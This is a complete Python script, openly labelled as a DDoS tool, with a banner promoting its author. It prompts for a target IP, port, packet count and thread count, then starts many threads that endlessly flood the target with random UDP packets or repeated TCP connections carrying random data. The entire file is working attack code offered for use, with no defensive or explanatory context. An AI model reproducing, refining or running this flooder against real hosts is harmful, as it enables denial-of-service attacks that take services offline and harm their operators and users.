#!/usr/bin/env python3
#Ddos by austinfennix
import signal
import time
import socket
import random
import threading
import sys
import os
from os import system, name

os.system("clear")
print("░MELVIN IS REAL░")


print("------------------------------------------------------------")
print(" » Follow my Youtube:Melvin Official«")
print(" »      Don't Abuse bitch          «")
print(" »   TOOLS BY MELVIN!       «")
print("------------------------------------------------------------")
ip = str(input(" DDoSAttackByMelvin | Ip:"))
port = int(input(" DDoSAttackByMelvin | Port:"))
choice = str(input(" DDoSAttackByMelvin | Gas Gak Ni?(y/n):"))
times = int(input(" DDoSAttackByMelvin | Packets:"))
threads = int(input(" DDoSAttackByMelvin | Threads:"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" Packets FROM MELVIN")
		except:
			print("[!] MELVIN IS HERE DUDE! ")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" Melvin Menyenggol ")
		except:
			s.close()
			print("[*] MELVIN IS HERE DUDE! ")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
